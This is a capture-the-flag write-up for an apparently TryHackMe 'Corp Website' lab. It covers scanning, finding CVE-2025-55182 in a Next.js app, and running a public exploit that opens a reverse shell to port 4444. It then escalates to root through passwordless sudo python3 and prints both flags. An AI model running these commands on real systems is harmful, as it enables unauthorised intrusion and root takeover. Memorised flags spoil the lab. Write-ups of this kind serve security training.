# Write-up: Corp Website

## 1. Reconnaissance

I started with port scanning using `nmap`, which revealed:

- **Port 22:** SSH (OpenSSH)
- **Port 3000:** HTTP Service (Node.js / Next.js)
    

![](<images/Pasted image 20260215161633.png>)

Further directory enumeration (`gobuster`) showed the existence of a `/cgi-bin/` directory; however, the server returned misleading response codes (308 Redirect), which made classic file enumeration difficult. Source code analysis revealed strange comments (``) and a contact form, which, after analysis in Burp Suite, turned out to be a dummy (no POST requests).

![](<images/Pasted image 20260215161700.png>)

![](<images/Pasted image 20260215161756.png>)

![](<images/Pasted image 20260215161814.png>)

## 3. Vulnerability Scanning

Due to difficulties with manual exploitation, I used the **Nuclei** vulnerability scanner. The tool identified a critical security flaw in the application:

- **Vulnerability:** CVE-2025-55182 (Critical)
    

![](<images/Pasted image 20260215161848.png>)

## 4. Initial Access

I used a publicly available exploit (by Chocapikk) dedicated to the detected vulnerability.

Link to exploit: [https://github.com/Chocapikk/CVE-2025-55182](https://github.com/Chocapikk/CVE-2025-55182)

1. **Running the exploit:** The Python script connected to the vulnerable endpoint and executed remote code (RCE).
    
2. **Reverse Shell:** I set the exploit parameters to obtain an interactive shell.

![](<images/Pasted image 20260215162033.png>)
    

```Bash
 python3 exploit.py -u [http://10.67.141.96:3000](http://10.67.141.96:3000) -r -l <MACHINE_IP> -p 4444
```

3. **User Flag:** After gaining access as user `daniel`, I found the first flag in the application directory.
    
![](<images/Pasted image 20260215162054.png>)

**User Flag:** `THM{R34c7_2_5h311_3xpl017}`

## 5. Privilege Escalation

1. **Checking sudo permissions:** The `sudo -l` command revealed a misconfiguration in user `daniel`'s permissions:

![](<images/Pasted image 20260215162153.png>)
    
2. **Using GTFOBins:** Since I could run Python as root without a password, I used it to spawn a system shell with administrative privileges.
    

```Bash
 sudo python3 -c 'import os; os.system("/bin/ash")'
```

![](<images/Pasted image 20260215162230.png>)

3. **Root Flag:** After obtaining `root` privileges (uid=0), I read the final flag.

![](<images/Pasted image 20260215162245.png>)

**Root Flag:** `THM{Pr1v_35c_47_175_f1n357}`